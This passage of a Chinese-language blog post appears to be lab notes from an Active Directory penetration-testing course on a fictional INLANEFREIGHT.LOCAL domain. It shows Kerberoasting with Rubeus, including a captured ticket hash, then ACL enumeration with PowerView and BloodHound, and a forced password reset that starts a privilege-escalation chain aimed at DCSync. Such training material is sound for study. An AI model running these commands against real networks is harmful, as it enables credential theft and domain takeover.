class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] Listing statistics about target users, no ticket requests being performed.</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"> | Supported Encryption <span class="built_in">Type</span>                        | Count |</span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"> | RC4_HMAC_DEFAULT                                 | <span class="number">7</span>     |</span><br><span class="line"> | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | <span class="number">2</span>     |</span><br><span class="line"> <span class="literal">------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"> <span class="literal">----------------------------------</span></span><br><span class="line"> | Password Last <span class="built_in">Set</span> Year | Count |</span><br><span class="line"> <span class="literal">----------------------------------</span></span><br><span class="line"> | <span class="number">2022</span>                   | <span class="number">9</span>     |</span><br><span class="line"> <span class="literal">----------------------------------</span></span><br></pre></td></tr></table></figure>

<p>筛选，<code>/nowrap</code> 不换行，<code>admincount=1</code> 可能的高价值目标</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe kerberoast /ldapfilter:<span class="string">&#x27;admincount=1&#x27;</span> /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line">[*] NOTICE: AES hashes will be returned <span class="keyword">for</span> AES<span class="literal">-enabled</span> accounts.</span><br><span class="line">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="keyword">for</span> these accounts.</span><br><span class="line"></span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] Total kerberoastable users : <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : backupagent</span><br><span class="line">[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local</span><br><span class="line">[*] PwdLastSet             : <span class="number">2</span>/<span class="number">15</span>/<span class="number">2022</span> <span class="number">2</span>:<span class="number">15</span>:<span class="number">40</span> PM</span><br><span class="line">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="line">[*] Hash                   : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*backupagent<span class="variable">$INLANEFREIGHT</span>.LOCAL<span class="variable">$backupjob</span>/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*<span class="variable">$750F377DEFA85A67EA0FE51B0B28F83D</span><span class="variable">$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E</span></span><br></pre></td></tr></table></figure>

<h4 id="request-ticket"><a href="#request-ticket" class="headerlink" title="request ticket"></a>request ticket</h4><p><code>/tgtdeleg</code> 指定在请求新服务票证时使用 RC4 加密</p>
<p>Rubeus 通过在 TGS 请求正文中指定 RC4 加密作为机器支持的唯一算法来实现这一点。这可能是 Active Directory 内置的故障保护，用于向后兼容。通过使用此标志，可以请求可以更快破解的 RC4（类型 23）加密票证。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729224185247.png" alt="kerb_tgs_18"></p>
<blockquote>
<p><strong>注意</strong>：</p>
<p>无论域功能级别如何，这都不适用于 Windows Server 2019 域控制器。它将始终返回使用目标帐户支持的最高加密级别加密的服务票证。</p>
<p>如果发现攻击所在的域中的域控制器运行在 Server 2016 或更早版本上（这很常见），启用 AES 不会通过仅返回 AES 加密票证（这更难破解）来部分缓解 Kerberoasting，而是会允许攻击者请求 RC4 加密的服务票证。</p>
<p>在 Windows Server 2019 DC 中，在 SPN 帐户上启用 AES 加密将导致收到 AES-256（类型 18）服务票证，这更难（但并非不可能）破解，尤其是在使用相对较弱的字典密码的情况下。</p>
</blockquote>
<hr>
<h1 id="ACL-Enumeration"><a href="#ACL-Enumeration" class="headerlink" title="ACL Enumeration"></a>ACL Enumeration</h1><p>ACL 中的设置本身称为<code>Access Control Entries</code>( <code>ACEs</code>)。每个 ACE 都映射回用户、组或进程（也称为安全主体），并定义授予该主体的权限。每个对象都有一个 ACL，可以有多个 ACE，因为多个安全主体可以访问 AD 中的对象。ACL 还可用于审核 AD 中的访问。</p>
<p>两种类型的 ACL：</p>
<ol>
<li><code>Discretionary Access Control List</code>( <code>DACL</code>) - 定义哪些安全主体被授予或拒绝访问对象。DACL 由允许或拒绝访问的 ACE 组成。当有人试图访问对象时，系统将检查 DACL 以了解允许的访问级别。如果某个对象不存在 DACL，则所有试图访问该对象的人都将被授予完全权限。如果 DACL 存在，但没有任何指定特定安全设置的 ACE 条目，则系统将拒绝所有试图访问该对象的用户、组或进程的访问。</li>
<li><code>System Access Control Lists</code>（<code>SACL</code>）- 允许管理员记录对安全对象的访问尝试。</li>
</ol>
<p>三种主要类型的 ACE 可应用于 AD 中的所有可安全对象：</p>
<table>
<thead>
<tr>
<th>ACE</th>
<th>Describe</th>
</tr>
</thead>
<tbody><tr>
<td><code>Access denied ACE</code></td>
<td>在 DACL 中用于表明明确拒绝用户或组访问某个对象</td>
</tr>
<tr>
<td><code>Access allowed ACE</code></td>
<td>在 DACL 中使用，表明用户或组被明确授予对某个对象的访问权限</td>
</tr>
<tr>
<td><code>System audit ACE</code></td>
<td>在 SACL 中用于在用户或组尝试访问对象时生成审计日志。它记录是否授予访问权限以及发生了哪种类型的访问</td>
</tr>
</tbody></table>
<p>每个 ACE 都有4个组件组成：</p>
<ol>
<li>有权访问该对象的用户&#x2F;组的安全标识符 (SID)（或以图形方式表示的主体名称）</li>
<li>表示 ACE 类型的标志（拒绝访问、允许访问或系统审计 ACE）</li>
<li>一组标志，指定子容器&#x2F;对象是否可以从主对象或父对象继承给定的 ACE 条目</li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN">访问掩码</a>是一个 32 位值，用于定义授予对象的权限</li>
</ol>
<p>ACL 攻击的威力：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#forcechangepassword">ForceChangePassword</a> - 赋予在不知道用户密码的情况下重置用户密码的权利（应谨慎使用，最好在重置密码之前咨询客户）。</li>
<li><a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericwrite">GenericWrite</a> - 赋予写入对象任何不受保护属性的权限。如果对用户拥有此访问权限，可以为他们分配 SPN 并执行 Kerberoasting 攻击（这依赖于目标帐户设置了弱密码）。对组而言，这意味着可以将自己或其他安全主体添加到给定组。最后，如果对计算机对象拥有此访问权限，可以执行基于资源的约束委派攻击。</li>
<li><code>AddSelf</code>- 显示用户可以将自己添加到的安全组。</li>
<li><a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall">GenericAll</a> - 这授予目标对象的完全控制权。同样，根据是否授予用户或组此权限，可以修改组成员身份、强制更改密码或执行有针对性的 Kerberoasting 攻击。如果对计算机对象具有此访问权限，并且环境中正在使用<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=46899">本地管理员密码解决方案 (LAPS)</a>，可以读取 LAPS 密码并获得对计算机的本地管理员访问权限，如果可以获得特权控制或获得某种特权访问权限。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://twitter.com/_nwodtuhs">此图改编自Charlie Bromberg (Shutdown)</a>制作的一张图，它很好地分解了各种可能的 ACE 攻击以及从 Windows 和 Linux（如果适用）执行这些攻击的工具。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729225499212.png" alt="ACL_attacks_graphic"></p>
<h2 id="PowerView-2"><a href="#PowerView-2" class="headerlink" title="PowerView"></a>PowerView</h2><p>PowerView 枚举 ACL，枚举所有结果的任务将非常耗时，而且可能不准确。</p>
<h3 id="Find-InterestingDomainAcl"><a href="#Find-InterestingDomainAcl" class="headerlink" title="Find-InterestingDomainAcl"></a>Find-InterestingDomainAcl</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Find-InterestingDomainAcl</span></span><br><span class="line"></span><br><span class="line">ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : ExtendedRight</span><br><span class="line">ObjectAceType           : ab721a53<span class="literal">-1e2f-11d0-9819-00aa0040529b</span></span><br><span class="line">AceFlags                : ContainerInherit</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : ContainerInherit</span><br><span class="line">SecurityIdentifier      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5189</span></span><br><span class="line">IdentityReferenceName   : Exchange Windows Permissions</span><br><span class="line">IdentityReferenceDomain : INLANEFREIGHT.LOCAL</span><br><span class="line">IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security </span><br><span class="line">                          Groups,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">IdentityReferenceClass  : <span class="built_in">group</span></span><br><span class="line"></span><br><span class="line">ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : ExtendedRight</span><br><span class="line">ObjectAceType           : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br><span class="line">AceFlags                : ContainerInherit</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : ContainerInherit</span><br><span class="line">SecurityIdentifier      : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5189</span></span><br><span class="line">IdentityReferenceName   : Exchange Windows Permissions</span><br><span class="line">IdentityReferenceDomain : INLANEFREIGHT.LOCAL</span><br><span class="line">IdentityReferenceDN     : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security </span><br><span class="line">                          Groups,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">IdentityReferenceClass  : <span class="built_in">group</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Get-DomainObjectACL"><a href="#Get-DomainObjectACL" class="headerlink" title="Get-DomainObjectACL"></a>Get-DomainObjectACL</h3><p>针对单个用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$sid</span> = <span class="built_in">Convert-NameToSid</span> wley</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainObjectACL</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Identity</span> * | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125; </span><br><span class="line"></span><br><span class="line">AceQualifier           : AccessAllowed</span><br><span class="line">ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights  : ExtendedRight</span><br><span class="line">ObjectAceType          : User<span class="literal">-Force-Change-Password</span></span><br><span class="line">ObjectSID              : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1176</span></span><br><span class="line">InheritanceFlags       : ContainerInherit</span><br><span class="line">BinaryLength           : <span class="number">56</span></span><br><span class="line">AceType                : AccessAllowedObject</span><br><span class="line">ObjectAceFlags         : ObjectAceTypePresent</span><br><span class="line">IsCallback             : False</span><br><span class="line">PropagationFlags       : None</span><br><span class="line">SecurityIdentifier     : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-1181</span></span><br><span class="line">AccessMask             : <span class="number">256</span></span><br><span class="line">AuditFlags             : None</span><br><span class="line">IsInherited            : False</span><br><span class="line">AceFlags               : ContainerInherit</span><br><span class="line">InheritedObjectAceType : All</span><br><span class="line">OpaqueLength           : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="Get-Acl-Get-ADUser"><a href="#Get-Acl-Get-ADUser" class="headerlink" title="Get-Acl &amp; Get-ADUser"></a>Get-Acl &amp; Get-ADUser</h2><p>此示例效率不高，并且该命令可能需要很长时间才能运行，尤其是在大型环境中。它将比使用 PowerView 的等效命令花费更长的时间。</p>
<h3 id="enum-ACLs"><a href="#enum-ACLs" class="headerlink" title="enum ACLs"></a>enum ACLs</h3><p>列出域用户，导入 ad_users.txt</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> <span class="literal">-ExpandProperty</span> SamAccountName &gt; ad_users.txt</span><br></pre></td></tr></table></figure>

<p>然后，用 foreach 循环读取文件的每一行，并使用 Get-Acl cmdlet 检索每个域用户的 ACL 信息，方法是将 ad_users.txt 文件的每一行提供给 Get-ADUser cmdlet。只选择 Access 属性，它将为提供有关访问权限的信息。将 IdentityReference 属性设置为控制的用户（或查看他们拥有哪些权限）。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="keyword">foreach</span>(<span class="variable">$line</span> <span class="keyword">in</span> [<span class="type">System.IO.File</span>]::ReadLines(<span class="string">&quot;C:\Users\-student\Desktop\ad_users.txt&quot;</span>)) &#123;<span class="built_in">get-acl</span>  <span class="string">&quot;AD:\<span class="variable">$</span>(Get-ADUser <span class="variable">$line</span>)&quot;</span> | <span class="built_in">Select-Object</span> Path <span class="literal">-ExpandProperty</span> Access | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&#x27;INLANEFREIGHT\\wley&#x27;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana </span><br><span class="line">                        Amundsen,OU=DevOps,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ActiveDirectoryRights : ExtendedRight</span><br><span class="line">InheritanceType       : All</span><br><span class="line">ObjectType            : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br><span class="line">InheritedObjectType   : <span class="number">00000000</span><span class="literal">-0000-0000-0000-000000000000</span></span><br><span class="line">ObjectFlags           : ObjectAceTypePresent</span><br><span class="line">AccessControlType     : Allow</span><br><span class="line">IdentityReference     : INLANEFREIGHT\wley</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : ContainerInherit</span><br><span class="line">PropagationFlags      : None</span><br></pre></td></tr></table></figure>

<p>反向搜索并映射到 GUID 值 <code>User-Force-Change-Password</code>，或 Google 搜索 <code>00299570-246d-11d0-a768-00aa006e0529</code>。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$guid</span>= <span class="string">&quot;00299570-246d-11d0-a768-00aa006e0529&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADObject</span> <span class="literal">-SearchBase</span> <span class="string">&quot;CN=Extended-Rights,<span class="variable">$</span>((Get-ADRootDSE).ConfigurationNamingContext)&quot;</span> <span class="literal">-Filter</span> &#123;ObjectClass <span class="operator">-like</span> <span class="string">&#x27;ControlAccessRight&#x27;</span>&#125; <span class="literal">-Properties</span> * |<span class="built_in">Select</span> Name,DisplayName,DistinguishedName,rightsGuid| ?&#123;<span class="variable">$_</span>.rightsGuid <span class="operator">-eq</span> <span class="variable">$guid</span>&#125; | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">Name              : User<span class="literal">-Force-Change-Password</span></span><br><span class="line">DisplayName       : Reset Password</span><br><span class="line">DistinguishedName : CN=User<span class="literal">-Force-Change-Password</span>,CN=Extended<span class="literal">-Rights</span>,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">rightsGuid        : <span class="number">00299570</span><span class="literal">-246d-11d0-a768-00aa006e0529</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password">User-Force-Change-Password extended right</a>，显示用户有权强制更改其他用户的密码。</p>
<h2 id="BloodHound-1"><a href="#BloodHound-1" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>将 wley 用户设置为起始节点，选择<code>Node Info</code>选项卡并向下滚动到<code>Outbound Control Rights</code>。此选项将显示通过组成员身份直接控制的对象，以及用户可以通过 ACL 攻击路径在<code>Transitive Object Control</code>下控制的对象数量。如果单击<code>First Degree Object Control</code>旁边的 <code>1</code>，将看到枚举的第一组权限，即 <code>damundsen</code> 用户的 <code>ForceChangePassword</code>。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729229524943.png" alt="wley_damundsen"></p>
<p>如果点击<code>16</code>旁边的<code>Transitive Object Control</code>，将看到上面精心列举的整个路径。从这里，可以利用每个边缘的帮助菜单来找到最佳的攻击方法。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729229648043.png" alt="wley_path"></p>
<hr>
<h1 id="ACL-Abuse"><a href="#ACL-Abuse" class="headerlink" title="ACL Abuse"></a>ACL Abuse</h1><p>启动攻击链，从而控制可以执行 DCSync 攻击的 adunn 用户，这将使能够检索域中所有用户的 NTLM 密码哈希，从而让完全控制域，并将权限升级到域&#x2F;企业管理员，甚至实现持久性，从而使完全控制域。要执行攻击链，必须执行以下操作：</p>
<ol>
<li>使用<code>wley</code>用户更改<code>damundsen</code>用户的密码</li>
<li>以<code>damundsen</code>用户身份进行身份验证并利用<code>GenericAll</code>权限将控制的用户添加到<code>Help Desk Level 1</code>组中</li>
<li>利用<code>Information Technology</code>组中嵌套的组成员身份并利用<code>GenericAll</code>权限来控制<code>adunn</code>用户</li>
</ol>
<h2 id="ForceChangePassword"><a href="#ForceChangePassword" class="headerlink" title="ForceChangePassword"></a>ForceChangePassword</h2><p>以<code>wley</code>用户的身份进行身份验证并强制更改其密码<code>damundsen</code>。可以先打开 PowerShell 控制台并以<code>wley</code>用户身份进行身份验证。</p>
<p>首先，创建一个<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0">PSCredential 对象</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;transporter@4&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\wley&#x27;</span>, <span class="variable">$SecPassword</span>) </span><br></pre></td></tr></table></figure>

<p>接下来，创建一个<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0">SecureString 对象</a>，是为目标用户<code>damundsen</code>设置的密码。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$damundsenPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p>最后，使用 PowerView 的 <a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/">Set-DomainUserPassword</a> 函数来更改用户的密码。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Set-DomainUserPassword</span> <span class="literal">-Identity</span> damundsen <span class="literal">-AccountPassword</span> <span class="variable">$damundsenPassword</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line">VERBOSE: [<span class="built_in">Get-PrincipalContext</span>] <span class="keyword">Using</span> alternate credentials</span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainUserPassword</span>] Attempting to <span class="built_in">set</span> the password <span class="keyword">for</span> user <span class="string">&#x27;damundsen&#x27;</span></span><br><span class="line">VERBOSE: [<span class="built_in">Set-DomainUserPassword</span>] Password <span class="keyword">for</span> user <span class="string">&#x27;damundsen&#x27;</span> successfully reset</span><br></pre></td></tr></table></figure>

<h2 id="GenericAll"><a href="#GenericAll" class="headerlink" title="GenericAll"></a>GenericAll</h2><p>将 <code>damundsen</code> 添加到 <code>Help Desk Level 1</code> 组。</p>
<p>创建 SecureString 对象</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;Pwn3d_by_ACLs!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$Cred2</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\damundsen&#x27;</span>, <span class="variable">$SecPassword</span>) </span><br></pre></td></tr></table></figure>

<p>PowerView 将 damundsen 添加到 Help Desk Level 1 组</p>
